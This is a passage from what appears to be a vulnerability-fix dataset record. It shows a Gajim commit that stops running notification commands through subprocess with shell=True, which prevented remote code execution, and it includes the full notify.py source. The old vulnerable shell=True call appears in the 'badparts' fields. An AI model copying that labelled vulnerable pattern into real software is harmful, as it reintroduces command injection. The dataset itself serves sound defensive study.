subprocess.Popen(args)","        gajim.thread_interface(p.wait)"]}]},"\/src\/notify.py":{"changes":[{"diff":"\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","add":1,"remove":1,"filename":"\/src\/notify.py","badparts":["                helpers.exec_command(obj.command)"],"goodparts":["                helpers.exec_command(obj.command, use_shell=True)"]},{"diff":"\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","add":1,"remove":1,"filename":"\/src\/notify.py","badparts":["                helpers.exec_command(obj.command)"],"goodparts":["                helpers.exec_command(obj.command, use_shell=True)"]}],"source":"\n import os import time from dialogs import PopupNotificationWindow import gobject import gtkgui_helpers import gtk from common import gajim from common import helpers from common import ged from common import dbus_support if dbus_support.supported: import dbus import dbus.glib USER_HAS_PYNOTIFY=True try: import pynotify pynotify.init('Gajim Notification') except ImportError: USER_HAS_PYNOTIFY=False def get_show_in_roster(event, account, contact, session=None): \"\"\" Return True if this event must be shown in roster, else False \"\"\" if event=='gc_message_received': return True if event=='message_received': if session and session.control: return False return True def get_show_in_systray(event, account, contact, type_=None): \"\"\" Return True if this event must be shown in systray, else False \"\"\" if type_=='printed_gc_msg' and not gajim.config.get( 'notify_on_all_muc_messages'): return False return gajim.config.get('trayicon_notification_on_events') def popup(event_type, jid, account, msg_type='', path_to_image=None, title=None, text=None): \"\"\" Notify a user of an event. It first tries to a valid implementation of the Desktop Notification Specification. If that fails, then we fall back to the older style PopupNotificationWindow method \"\"\" if not path_to_image: path_to_image=gtkgui_helpers.get_icon_path('gajim-chat_msg_recv', 48) if gajim.config.get('use_notif_daemon') and dbus_support.supported: try: DesktopNotification(event_type, jid, account, msg_type, path_to_image, title, gobject.markup_escape_text(text)) return except dbus.DBusException, e: gajim.log.debug(str(e)) except TypeError, e: gajim.log.debug(str(e)) if gajim.config.get('use_notif_daemon') and USER_HAS_PYNOTIFY: if not text and event_type=='new_message': _text=gobject.markup_escape_text( gajim.get_name_from_jid(account, jid)) else: _text=gobject.markup_escape_text(text) if not title: _title='' else: _title=title notification=pynotify.Notification(_title, _text) timeout=gajim.config.get('notification_timeout') * 1000 notification.set_timeout(timeout) notification.set_category(event_type) notification.set_data('event_type', event_type) notification.set_data('jid', jid) notification.set_data('account', account) notification.set_data('msg_type', msg_type) notification.set_property('icon-name', path_to_image) if 'actions' in pynotify.get_server_caps(): notification.add_action('default', 'Default Action', on_pynotify_notification_clicked) try: notification.show() return except gobject.GError, e: gajim.log.debug(str(e)) instance=PopupNotificationWindow(event_type, jid, account, msg_type, path_to_image, title, text) gajim.interface.roster.popup_notification_windows.append(instance) def on_pynotify_notification_clicked(notification, action): jid=notification.get_data('jid') account=notification.get_data('account') msg_type=notification.get_data('msg_type') notification.close() gajim.interface.handle_event(account, jid, msg_type) class Notification: \"\"\" Handle notifications \"\"\" def __init__(self): gajim.ged.register_event_handler('notification', ged.GUI2, self._nec_notification) def _nec_notification(self, obj): if obj.do_popup: popup(obj.popup_event_type, obj.jid, obj.conn.name, obj.popup_msg_type, path_to_image=obj.popup_image, title=obj.popup_title, text=obj.popup_text) if obj.do_sound: if obj.sound_file: helpers.play_sound_file(obj.sound_file) elif obj.sound_event: helpers.play_sound(obj.sound_event) if obj.do_command: try: helpers.exec_command(obj.command) except Exception: pass class NotificationResponseManager: \"\"\" Collect references to pending DesktopNotifications and manages there signalling. This is necessary due to a bug in DBus where you can't remove a signal from an interface once it's connected \"\"\" def __init__(self): self.pending={} self.received=[] self.interface=None def attach_to_interface(self): if self.interface is not None: return self.interface=dbus_support.get_notifications_interface() self.interface.connect_to_signal('ActionInvoked', self.on_action_invoked) self.interface.connect_to_signal('NotificationClosed', self.on_closed) def on_action_invoked(self, id_, reason): if id_ in self.pending: notification=self.pending[id_] notification.on_action_invoked(id_, reason) del self.pending[id_] return self.received.append((id_, time.time(), reason)) if len(self.received) > 20: curt=time.time() for rec in self.received: diff=curt -rec[1] if diff > 10: self.received.remove(rec) def on_closed(self, id_, reason=None): if id_ in self.pending: del self.pending[id_] def add_pending(self, id_, object_): for rec in self.received: if rec[0]==id_: object_.on_action_invoked(id_, rec[2]) self.received.remove(rec) return if id_ not in self.pending: self.pending[id_]=object_ else: gajim.log.debug('Duplicate ID of notification. Can\\'t handle this.') notification_response_manager=NotificationResponseManager() class DesktopNotification: \"\"\" A DesktopNotification that interfaces with D-Bus via the Desktop Notification Specification \"\"\" def __init__(self, event_type, jid, account, msg_type='', path_to_image=None, title=None, text=None): self.path_to_image=os.path.abspath(path_to_image) self.event_type=event_type self.title=title self.text=text self.default_version=[0, 3, 1] self.account=account self.jid=jid self.msg_type=msg_type if not text and event_type=='new_message': self.text=gajim.get_name_from_jid(account, jid) if not title: self.title=event_type if event_type==_('Contact Signed In'): ntype='presence.online' elif event_type==_('Contact Signed Out'): ntype='presence.offline' elif event_type in(_('New Message'), _('New Single Message'), _('New Private Message')): ntype='im.received' elif event_type==_('File Transfer Request'): ntype='transfer' elif event_type==_('File Transfer Error'): ntype='transfer.error' elif event_type in(_('File Transfer Completed'), _('File Transfer Stopped')): ntype='transfer.complete' elif event_type==_('New E-mail'): ntype='email.arrived' elif event_type==_('Groupchat Invitation'): ntype='im.invitation' elif event_type==_('Contact Changed Status'): ntype='presence.status' elif event_type==_('Connection Failed'): ntype='connection.failed' elif event_type==_('Subscription request'): ntype='subscription.request' elif event_type==_('Unsubscribed'): ntype='unsubscribed' else: self.path_to_image=gtkgui_helpers.get_icon_path( 'gajim-chat_msg_recv', 48) ntype='im' self.notif=dbus_support.get_notifications_interface(self) if self.notif is None: raise dbus.DBusException('unable to get notifications interface') self.ntype=ntype if self.kde_notifications: self.attempt_notify() else: self.capabilities=self.notif.GetCapabilities() if self.capabilities is None: self.capabilities=['actions'] self.get_version() def attempt_notify(self): timeout=gajim.config.get('notification_timeout') ntype=self.ntype if self.kde_notifications: notification_text=('<html><img src=\"%(image)s\" align=left \/>' \\ '%(title)s<br\/>%(text)s<\/html>') %{'title': self.title, 'text': self.text, 'image': self.path_to_image} gajim_icon=gtkgui_helpers.get_icon_path('gajim', 48) try: self.notif.Notify( dbus.String(_('Gajim')), dbus.UInt32(0), ntype, dbus.String(gajim_icon), dbus.String(''), dbus.String(notification_text), (dbus.String('default'), dbus.String(self.event_type), dbus.String('ignore'), dbus.String(_('Ignore'))), [], dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) return except Exception: pass version=self.version if version[:2]==[0, 2]: actions={} if 'actions' in self.capabilities: actions={'default': 0} try: self.notif.Notify( dbus.String(_('Gajim')), dbus.String(self.path_to_image), dbus.UInt32(0), ntype, dbus.Byte(0), dbus.String(self.title), dbus.String(self.text), [dbus.String(self.path_to_image)], actions, [''], True, dbus.UInt32(timeout), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except AttributeError: version=[0, 3, 1] if version >[0, 3]: if gajim.interface.systray_enabled and \\ gajim.config.get('attach_notifications_to_systray'): status_icon=gajim.interface.systray.status_icon x, y, width, height=status_icon.get_geometry()[1] pos_x=x +(width \/ 2) pos_y=y +(height \/ 2) hints={'x': pos_x, 'y': pos_y} else: hints={} if version >=[0, 3, 2]: hints['urgency']=dbus.Byte(0) hints['category']=dbus.String(ntype) if self.text: text=self.text if len(self.text) > 200: text='%s\\n...' % self.text[:200] else: text=' ' if os.environ.get('KDE_FULL_SESSION')=='true': text='<table style=\\'padding: 3px\\'><tr><td>' \\ '<img src=\\\"%s\\\"><\/td><td width=20> <\/td>' \\ '<td>%s<\/td><\/tr><\/table>' %(self.path_to_image, text) self.path_to_image=os.path.abspath( gtkgui_helpers.get_icon_path('gajim', 48)) actions=() if 'actions' in self.capabilities: actions=(dbus.String('default'), dbus.String( self.event_type)) try: self.notif.Notify( dbus.String(_('Gajim')), dbus.UInt32(0), dbus.String(self.path_to_image), dbus.String(self.title), dbus.String(text), actions, hints, dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except Exception, e: self.notify_another_way(e) else: try: self.notif.Notify( dbus.String(_('Gajim')), dbus.String(self.path_to_image), dbus.UInt32(0), dbus.String(self.title), dbus.String(self.text), dbus.String(''), hints, dbus.UInt32(timeout*1000), reply_handler=self.attach_by_id, error_handler=self.notify_another_way) except Exception, e: self.notify_another_way(e) def attach_by_id(self, id_): notification_response_manager.attach_to_interface() notification_response_manager.add_pending(id_, self) def notify_another_way(self, e): gajim.log.debug('Error when trying to use notification daemon: %s' % \\ str(e)) instance=PopupNotificationWindow(self.event_type, self.jid, self.account, self.msg_type, self.path_to_image, self.title, self.text) gajim.interface.roster.popup_notification_windows.append(instance) def on_action_invoked(self, id_, reason): if self.notif is None: return self.notif.CloseNotification(dbus.UInt32(id_)) self.notif=None if reason=='ignore': return gajim.interface.handle_event(self.account, self.jid, self.msg_type) def version_reply_handler(self, name, vendor, version, spec_version=None): if spec_version: version=spec_version elif vendor=='Xfce' and version.startswith('0.1.0'): version='0.9' version_list=version.split('.') self.version=[] try: while len(version_list): self.version.append(int(version_list.pop(0))) except ValueError: self.version_error_handler_3_x_try(None) self.attempt_notify() def get_version(self): self.notif.GetServerInfo( reply_handler=self.version_reply_handler, error_handler=self.version_error_handler_2_x_try) def version_error_handler_2_x_try(self, e): self.notif.GetServerInformation( reply_handler=self.version_reply_handler, error_handler=self.version_error_handler_3_x_try) def version_error_handler_3_x_try(self, e): self.version=self.default_version self.attempt_notify() ","sourceWithComments":"# -*- coding:utf-8 -*-\n## src\/notify.py\n##\n## Copyright (C) 2005 Sebastian Estienne\n## Copyright (C) 2005-2006 Andrew Sayman <lorien420 AT myrealbox.com>\n## Copyright (C) 2005-2007 Nikos Kouremenos <kourem AT gmail.com>\n## Copyright (C) 2005-2010 Yann Leboulanger <asterix AT lagaule.org>\n## Copyright (C) 2006 Travis Shirk <travis AT pobox.com>\n## Copyright (C) 2006-2008 Jean-Marie Traissard <jim AT lapin.org>\n## Copyright (C) 2007 Julien Pivotto <roidelapluie AT gmail.com>\n##                    Stephan Erb <steve-e AT h3c.de>\n## Copyright (C) 2008 Brendan Taylor <whateley AT gmail.com>\n##                    Jonathan Schleifer <js-gajim AT webkeks.org>\n##\n## This file is part of Gajim.\n##\n## Gajim is free software; you can redistribute it and\/or modify\n## it under the terms of the GNU General Public License as published\n## by the Free Software Foundation; version 3 only.\n##\n## Gajim is distributed in the hope that it will be useful,\n## but WITHOUT ANY WARRANTY; without even the implied warranty of\n## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n## GNU General Public License for more details.\n##\n## You should have received a copy of the GNU General Public License\n## along with Gajim. If not, see <http:\/\/www.gnu.org\/licenses\/>.\n##\n\nimport os\nimport time\nfrom dialogs import PopupNotificationWindow\nimport gobject\nimport gtkgui_helpers\nimport gtk\n\nfrom common import gajim\nfrom common import helpers\nfrom common import ged\n\nfrom common import dbus_support\nif dbus_support.supported:\n    import dbus\n    import dbus.glib\n\n\nUSER_HAS_PYNOTIFY = True # user has pynotify module\ntry:\n    import pynotify\n    pynotify.init('Gajim Notification')\nexcept ImportError:\n    USER_HAS_PYNOTIFY = False\n\ndef get_show_in_roster(event, account, contact, session=None):\n    \"\"\"\n    Return True if this event must be shown in roster, else False\n    \"\"\"\n    if event == 'gc_message_received':\n        return True\n    if event == 'message_received':\n        if session and session.control:\n            return False\n    return True\n\ndef get_show_in_systray(event, account, contact, type_=None):\n    \"\"\"\n    Return True if this event must be shown in systray, else False\n    \"\"\"\n    if type_ == 'printed_gc_msg' and not gajim.config.get(\n    'notify_on_all_muc_messages'):\n        # it's not an highlighted message, don't show in systray\n        return False\n    return gajim.config.get('trayicon_notification_on_events')\n\ndef popup(event_type, jid, account, msg_type='', path_to_image=None, title=None,\ntext=None):\n    \"\"\"\n    Notify a user of an event. It first tries to a valid implementation of\n    the Desktop Notification Specification. If that fails, then we fall back to\n    the older style PopupNotificationWindow method\n    \"\"\"\n    # default image\n    if not path_to_image:\n        path_to_image = gtkgui_helpers.get_icon_path('gajim-chat_msg_recv', 48)\n\n    # Try to show our popup via D-Bus and notification daemon\n    if gajim.config.get('use_notif_daemon') and dbus_support.supported:\n        try:\n            DesktopNotification(event_type, jid, account, msg_type,\n                path_to_image, title, gobject.markup_escape_text(text))\n            return  # sucessfully did D-Bus Notification procedure!\n        except dbus.DBusException, e:\n            # Connection to D-Bus failed\n            gajim.log.debug(str(e))\n        except TypeError, e:\n            # This means that we sent the message incorrectly\n            gajim.log.debug(str(e))\n\n    # Ok, that failed. Let's try pynotify, which also uses notification daemon\n    if gajim.config.get('use_notif_daemon') and USER_HAS_PYNOTIFY:\n        if not text and event_type == 'new_message':\n            # empty text for new_message means do_preview = False\n            # -> default value for text\n            _text = gobject.markup_escape_text(\n                gajim.get_name_from_jid(account, jid))\n        else:\n            _text = gobject.markup_escape_text(text)\n\n        if not title:\n            _title = ''\n        else:\n            _title = title\n\n        notification = pynotify.Notification(_title, _text)\n        timeout = gajim.config.get('notification_timeout') * 1000 # make it ms\n        notification.set_timeout(timeout)\n\n        notification.set_category(event_type)\n        notification.set_data('event_type', event_type)\n        notification.set_data('jid', jid)\n        notification.set_data('account', account)\n        notification.set_data('msg_type', msg_type)\n        notification.set_property('icon-name', path_to_image)\n        if 'actions' in pynotify.get_server_caps():\n            notification.add_action('default', 'Default Action',\n                    on_pynotify_notification_clicked)\n\n        try:\n            notification.show()\n            return\n        except gobject.GError, e:\n            # Connection to notification-daemon failed, see #2893\n            gajim.log.debug(str(e))\n\n    # Either nothing succeeded or the user wants old-style notifications\n    instance = PopupNotificationWindow(event_type, jid, account, msg_type,\n        path_to_image, title, text)\n    gajim.interface.roster.popup_notification_windows.append(instance)\n\ndef on_pynotify_notification_clicked(notification, action):\n    jid = notification.get_data('jid')\n    account = notification.get_data('account')\n    msg_type = notification.get_data('msg_type')\n\n    notification.close()\n    gajim.interface.handle_event(account, jid, msg_type)\n\nclass Notification:\n    \"\"\"\n    Handle notifications\n    \"\"\"\n    def __init__(self):\n        gajim.ged.register_event_handler('notification', ged.GUI2,\n            self._nec_notification)\n\n    def _nec_notification(self, obj):\n        if obj.do_popup:\n            popup(obj.popup_event_type, obj.jid, obj.conn.name,\n                obj.popup_msg_type, path_to_image=obj.popup_image,\n                title=obj.popup_title, text=obj.popup_text)\n\n        if obj.do_sound:\n            if obj.sound_file:\n                helpers.play_sound_file(obj.sound_file)\n            elif obj.sound_event:\n                helpers.play_sound(obj.sound_event)\n\n        if obj.do_command:\n            try:\n                helpers.exec_command(obj.command)\n            except Exception:\n                pass\n\nclass NotificationResponseManager:\n    \"\"\"\n    Collect references to pending DesktopNotifications and manages there\n    signalling. This is necessary due to a bug in DBus where you can't remove a\n    signal from an interface once it's connected\n    \"\"\"\n\n    def __init__(self):\n        self.pending = {}\n        self.received = []\n        self.interface = None\n\n    def attach_to_interface(self):\n        if self.interface is not None:\n            return\n        self.interface = dbus_support.get_notifications_interface()\n        self.interface.connect_to_signal('ActionInvoked',\n            self.on_action_invoked)\n        self.interface.connect_to_signal('NotificationClosed', self.on_closed)\n\n    def on_action_invoked(self, id_, reason):\n        if id_ in self.pending:\n            notification = self.pending[id_]\n            notification.on_action_invoked(id_, reason)\n            del self.pending[id_]\n            return\n        # got an action on popup that isn't handled yet? Maybe user clicked too\n        # fast. Remember it.\n        self.received.append((id_, time.time(), reason))\n        if len(self.received) > 20:\n            curt = time.time()\n            for rec in self.received:\n                diff = curt - rec[1]\n                if diff > 10:\n                    self.received.remove(rec)\n\n    def on_closed(self, id_, reason=None):\n        if id_ in self.pending:\n            del self.pending[id_]\n\n    def add_pending(self, id_, object_):\n        # Check to make sure that we handle an event immediately if we're adding\n        # an id that's already been triggered\n        for rec in self.received:\n            if rec[0] == id_:\n                object_.on_action_invoked(id_, rec[2])\n                self.received.remove(rec)\n                return\n        if id_ not in self.pending:\n            # Add it\n            self.pending[id_] = object_\n        else:\n            # We've triggered an event that has a duplicate ID!\n            gajim.log.debug('Duplicate ID of notification. Can\\'t handle this.')\n\nnotification_response_manager = NotificationResponseManager()\n\nclass DesktopNotification:\n    \"\"\"\n    A DesktopNotification that interfaces with D-Bus via the Desktop\n    Notification Specification\n    \"\"\"\n\n    def __init__(self, event_type, jid, account, msg_type='',\n    path_to_image=None, title=None, text=None):\n        self.path_to_image = os.path.abspath(path_to_image)\n        self.event_type = event_type\n        self.title = title\n        self.text = text\n        # 0.3.1 is the only version of notification daemon that has no way\n        # to determine which version it is. If no method exists, it means\n        # they're using that one.\n        self.default_version = [0, 3, 1]\n        self.account = account\n        self.jid = jid\n        self.msg_type = msg_type\n\n        # default value of text\n        if not text and event_type == 'new_message':\n            # empty text for new_message means do_preview = False\n            self.text = gajim.get_name_from_jid(account, jid)\n\n        if not title:\n            self.title = event_type # default value\n\n        if event_type == _('Contact Signed In'):\n            ntype = 'presence.online'\n        elif event_type == _('Contact Signed Out'):\n            ntype = 'presence.offline'\n        elif event_type in (_('New Message'), _('New Single Message'),\n        _('New Private Message')):\n            ntype = 'im.received'\n        elif event_type == _('File Transfer Request'):\n            ntype = 'transfer'\n        elif event_type == _('File Transfer Error'):\n            ntype = 'transfer.error'\n        elif event_type in (_('File Transfer Completed'),\n        _('File Transfer Stopped')):\n            ntype = 'transfer.complete'\n        elif event_type == _('New E-mail'):\n            ntype = 'email.arrived'\n        elif event_type == _('Groupchat Invitation'):\n            ntype = 'im.invitation'\n        elif event_type == _('Contact Changed Status'):\n            ntype = 'presence.status'\n        elif event_type == _('Connection Failed'):\n            ntype = 'connection.failed'\n        elif event_type == _('Subscription request'):\n            ntype = 'subscription.request'\n        elif event_type == _('Unsubscribed'):\n            ntype = 'unsubscribed'\n        else:\n            # default failsafe values\n            self.path_to_image = gtkgui_helpers.get_icon_path(\n                'gajim-chat_msg_recv', 48)\n            ntype = 'im' # Notification Type\n\n        self.notif = dbus_support.get_notifications_interface(self)\n        if self.notif is None:\n            raise dbus.DBusException('unable to get notifications interface')\n        self.ntype = ntype\n\n        if self.kde_notifications:\n            self.attempt_notify()\n        else:\n            self.capabilities = self.notif.GetCapabilities()\n            if self.capabilities is None:\n                self.capabilities = ['actions']\n            self.get_version()\n\n    def attempt_notify(self):\n        timeout = gajim.config.get('notification_timeout') # in seconds\n        ntype = self.ntype\n        if self.kde_notifications:\n            notification_text = ('<html><img src=\"%(image)s\" align=left \/>' \\\n                '%(title)s<br\/>%(text)s<\/html>') % {'title': self.title,\n                'text': self.text, 'image': self.path_to_image}\n            gajim_icon = gtkgui_helpers.get_icon_path('gajim', 48)\n            try:\n                self.notif.Notify(\n                    dbus.String(_('Gajim')),        # app_name (string)\n                    dbus.UInt32(0),                 # replaces_id (uint)\n                    ntype,                          # event_id (string)\n                    dbus.String(gajim_icon),        # app_icon (string)\n                    dbus.String(''),                # summary (string)\n                    dbus.String(notification_text), # body (string)\n                    # actions (stringlist)\n                    (dbus.String('default'), dbus.String(self.event_type),\n                    dbus.String('ignore'), dbus.String(_('Ignore'))),\n                    [],                                                                             # hints (not used in KDE yet)\n                    dbus.UInt32(timeout*1000),      # timeout (int), in ms\n                    reply_handler=self.attach_by_id,\n                    error_handler=self.notify_another_way)\n                return\n            except Exception:\n                pass\n        version = self.version\n        if version[:2] == [0, 2]:\n            actions = {}\n            if 'actions' in self.capabilities:\n                actions = {'default': 0}\n            try:\n                self.notif.Notify(\n                    dbus.String(_('Gajim')),\n                    dbus.String(self.path_to_image),\n                    dbus.UInt32(0),\n                    ntype,\n                    dbus.Byte(0),\n                    dbus.String(self.title),\n                    dbus.String(self.text),\n                    [dbus.String(self.path_to_image)],\n                    actions,\n                    [''],\n                    True,\n                    dbus.UInt32(timeout),\n                    reply_handler=self.attach_by_id,\n                    error_handler=self.notify_another_way)\n            except AttributeError:\n                # we're actually dealing with the newer version\n                version = [0, 3, 1]\n        if version > [0, 3]:\n            if gajim.interface.systray_enabled and \\\n            gajim.config.get('attach_notifications_to_systray'):\n                status_icon = gajim.interface.systray.status_icon\n                x, y, width, height = status_icon.get_geometry()[1]\n                pos_x = x + (width \/ 2)\n                pos_y = y + (height \/ 2)\n                hints = {'x': pos_x, 'y': pos_y}\n            else:\n                hints = {}\n            if version >= [0, 3, 2]:\n                hints['urgency'] = dbus.Byte(0) # Low Urgency\n                hints['category'] = dbus.String(ntype)\n                # it seems notification-daemon doesn't like empty text\n                if self.text:\n                    text = self.text\n                    if len(self.text) > 200:\n                        text = '%s\\n...' % self.text[:200]\n                else:\n                    text = ' '\n                if os.environ.get('KDE_FULL_SESSION') == 'true':\n                    text = '<table style=\\'padding: 3px\\'><tr><td>' \\\n                        '<img src=\\\"%s\\\"><\/td><td width=20> <\/td>' \\\n                        '<td>%s<\/td><\/tr><\/table>' % (self.path_to_image,\n                        text)\n                    self.path_to_image = os.path.abspath(\n                        gtkgui_helpers.get_icon_path('gajim', 48))\n                actions = ()\n                if 'actions' in self.capabilities:\n                    actions = (dbus.String('default'), dbus.String(\n                        self.event_type))\n                try:\n                    self.notif.Notify(\n                        dbus.String(_('Gajim')),\n                        # this notification does not replace other\n                        dbus.UInt32(0),\n                        dbus.String(self.path_to_image),\n                        dbus.String(self.title),\n                        dbus.String(text),\n                        actions,\n                        hints,\n                        dbus.UInt32(timeout*1000),\n                        reply_handler=self.attach_by_id,\n                        error_handler=self.notify_another_way)\n                except Exception, e:\n                    self.notify_another_way(e)\n            else:\n                try:\n                    self.notif.Notify(\n                        dbus.String(_('Gajim')),\n                        dbus.String(self.path_to_image),\n                        dbus.UInt32(0),\n                        dbus.String(self.title),\n                        dbus.String(self.text),\n                        dbus.String(''),\n                        hints,\n                        dbus.UInt32(timeout*1000),\n                        reply_handler=self.attach_by_id,\n                        error_handler=self.notify_another_way)\n                except Exception, e:\n                    self.notify_another_way(e)\n\n    def attach_by_id(self, id_):\n        notification_response_manager.attach_to_interface()\n        notification_response_manager.add_pending(id_, self)\n\n    def notify_another_way(self, e):\n        gajim.log.debug('Error when trying to use notification daemon: %s' % \\\n            str(e))\n        instance = PopupNotificationWindow(self.event_type, self.jid,\n            self.account, self.msg_type, self.path_to_image, self.title,\n            self.text)\n        gajim.interface.roster.popup_notification_windows.append(instance)\n\n    def on_action_invoked(self, id_, reason):\n        if self.notif is None:\n            return\n        self.notif.CloseNotification(dbus.UInt32(id_))\n        self.notif = None\n\n        if reason == 'ignore':\n            return\n\n        gajim.interface.handle_event(self.account, self.jid, self.msg_type)\n\n    def version_reply_handler(self, name, vendor, version, spec_version=None):\n        if spec_version:\n            version = spec_version\n        elif vendor == 'Xfce' and version.startswith('0.1.0'):\n            version = '0.9'\n        version_list = version.split('.')\n        self.version = []\n        try:\n            while len(version_list):\n                self.version.append(int(version_list.pop(0)))\n        except ValueError:\n            self.version_error_handler_3_x_try(None)\n        self.attempt_notify()\n\n    def get_version(self):\n        self.notif.GetServerInfo(\n            reply_handler=self.version_reply_handler,\n            error_handler=self.version_error_handler_2_x_try)\n\n    def version_error_handler_2_x_try(self, e):\n        self.notif.GetServerInformation(\n            reply_handler=self.version_reply_handler,\n            error_handler=self.version_error_handler_3_x_try)\n\n    def version_error_handler_3_x_try(self, e):\n        self.version = self.default_version\n        self.attempt_notify()\n"}},"msg":"execute commands without use_shell=True to prevent remote code execution, except for commands configured in triggers plugin (configured by user itself). Fixes #7031"}},"https:\/\/github.com\/Hoeze\/gajim":{"4c66686f53e86dc0b86148a310db0bfc60c92253":{"url":"https:\/\/api.github.com\/repos\/Hoeze\/gajim\/commits\/4c66686f53e86dc0b86148a310db0bfc60c92253","html_url":"https:\/\/github.com\/Hoeze\/gajim\/commit\/4c66686f53e86dc0b86148a310db0bfc60c92253","message":"execute commands without use_shell=True to prevent remote code execution, except for commands configured in triggers plugin (configured by user itself). Fixes #7031","sha":"4c66686f53e86dc0b86148a310db0bfc60c92253","keyword":"remote code execution prevent","diff":"diff --git a\/src\/common\/helpers.py b\/src\/common\/helpers.py\nindex 722fbebe2..97996f01b 100644\n--- a\/src\/common\/helpers.py\n+++ b\/src\/common\/helpers.py\n@@ -40,6 +40,7 @@\n import select\n import base64\n import hashlib\n+import shlex\n import caps_cache\n \n from encodings.punycode import punycode_encode\n@@ -381,8 +382,18 @@ def is_in_path(command, return_abs_path=False):\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)\ndiff --git a\/src\/notify.py b\/src\/notify.py\nindex a8a737863..1f6eada51 100644\n--- a\/src\/notify.py\n+++ b\/src\/notify.py\n@@ -167,7 +167,7 @@ def _nec_notification(self, obj):\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","files":{"\/src\/common\/helpers.py":{"changes":[{"diff":"\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)","add":12,"remove":2,"filename":"\/src\/common\/helpers.py","badparts":["def exec_command(command):","    subprocess.Popen('%s &' % command, shell=True).wait()"],"goodparts":["def exec_command(command, use_shell=False):","    \"\"\"","    execute a command. if use_shell is True, we run the command as is it was","    typed in a console. So it may be dangerous if you are not sure about what","    is executed.","    \"\"\"","    if use_shell:","        subprocess.Popen('%s &' % command, shell=True).wait()","    else:","        args = shlex.split(command.encode('utf-8'))","        p = subprocess.Popen(args)","        gajim.thread_interface(p.wait)"]},{"diff":"\n             pass\n     return False\n \n-def exec_command(command):\n-    subprocess.Popen('%s &' % command, shell=True).wait()\n+def exec_command(command, use_shell=False):\n+    \"\"\"\n+    execute a command. if use_shell is True, we run the command as is it was\n+    typed in a console. So it may be dangerous if you are not sure about what\n+    is executed.\n+    \"\"\"\n+    if use_shell:\n+        subprocess.Popen('%s &' % command, shell=True).wait()\n+    else:\n+        args = shlex.split(command.encode('utf-8'))\n+        p = subprocess.Popen(args)\n+        gajim.thread_interface(p.wait)\n \n def build_command(executable, parameter):\n     # we add to the parameter (can hold path with spaces)","add":12,"remove":2,"filename":"\/src\/common\/helpers.py","badparts":["def exec_command(command):","    subprocess.Popen('%s &' % command, shell=True).wait()"],"goodparts":["def exec_command(command, use_shell=False):","    \"\"\"","    execute a command. if use_shell is True, we run the command as is it was","    typed in a console. So it may be dangerous if you are not sure about what","    is executed.","    \"\"\"","    if use_shell:","        subprocess.Popen('%s &' % command, shell=True).wait()","    else:","        args = shlex.split(command.encode('utf-8'))","        p = subprocess.Popen(args)","        gajim.thread_interface(p.wait)"]}]},"\/src\/notify.py":{"changes":[{"diff":"\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","add":1,"remove":1,"filename":"\/src\/notify.py","badparts":["                helpers.exec_command(obj.command)"],"goodparts":["                helpers.exec_command(obj.command, use_shell=True)"]},{"diff":"\n \n         if obj.do_command:\n             try:\n-                helpers.exec_command(obj.command)\n+                helpers.exec_command(obj.command, use_shell=True)\n             except Exception:\n                 pass\n \n","add":1,"remove":1,"filename":"\/src\/notify.py","badparts":["                helpers.exec_command(obj.command)"],"goodparts":["                helpers.exec_command(obj.command, use_shell=True)"]}],"source":"\n import os import time from dialogs import PopupNotificationWindow import gobject import gtkgui_helpers import gtk from common import gajim from common import helpers from common import ged from common import dbus_support if dbus_support.supported: import dbus import dbus.glib USER_HAS_PYNOTIFY=True try: import pynotify pynotify.init('Gajim Notification') except ImportError: USER_HAS_PYNOTIFY=False def get_show_in_roster(event, account, contact, session=None): \"\"\" Return True if this event must be shown in roster, else False \"\"\" if event=='gc_message_received': return True if event=='message_received': if session and session.control: return False return True def get_show_in_systray(event, account, contact, type_=None): \"\"\" Return True if this event must be shown in systray, else False \"\"\" if type_=='printed_gc_msg' and not gajim.config.get( 'notify_on_all_muc_messages'): return False return gajim.config.get('trayicon_notification_on_events') def popup(event_type, jid, account, msg_type='', path_to_image=None, title=None, text=None): \"\"\" Notify a user of an event. It first tries to a valid implementation of the Desktop Notification Specification. If that fails, then we fall back to the older style PopupNotificationWindow method \"\"\" if not path_to_image: path_to_image=gtkgui_helpers.get_icon_path('gajim-chat_msg_recv', 48) if gajim.config.get('use_notif_daemon') and dbus_support.supported: try: DesktopNotification(event_type, jid, account, msg_type, path_to_image, title, gobject.markup_escape_text(text)) return except dbus.DBusException, e: gajim.log.debug(str(e)) except TypeError, e: gajim.log.debug(str(e)) if gajim.config.get('use_notif_daemon') and USER_HAS_PYNOTIFY: if not text and event_type=='new_message': _text=gobject.markup_escape_text( gajim.get_name_from_jid(account, jid)) else: _text=gobject.markup_escape_text(text) if not title: _title='' else: _title=title 